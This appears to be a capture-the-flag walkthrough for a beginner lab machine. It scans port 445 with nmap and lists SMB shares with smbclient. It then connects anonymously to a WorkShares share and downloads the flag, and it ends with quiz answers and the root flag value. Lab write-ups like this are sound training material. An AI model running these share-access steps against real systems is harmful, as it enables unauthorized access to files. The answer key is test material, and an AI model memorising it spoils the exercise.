# Dancing - Very Easy

```shell
nmap -T4 -p 445 -A 10.129.254.67
#scans the machine at port 445

smbclient -L //10.129.254.67
#checks the shares

smbclient //10.129.254.67/WorkShares
#connect to WorkShares

ls
#this shows two directories

cd James.P\

ls

get flag.txt

quit

cat flag.txt
#root flag
```

1. What does the 3-letter acronym SMB stand for? - Server Message Block

2. What port does SMB use to operate at? - 445

3. What network communication model does SMB use? - client-server model

4. What is the service name for port 445 that came up in our nmap scan? - microsoft-ds

5. What is the tool we used to connect to SMB shares from our Linux distribution? - smbclient

6. What is the flag we can use with the SMB tool to list the contents of the share? - -L

7. What is the name of the share we are able to access in the end?

8. Root flag - 5f61c10dffbc77a704d76016a22f1664
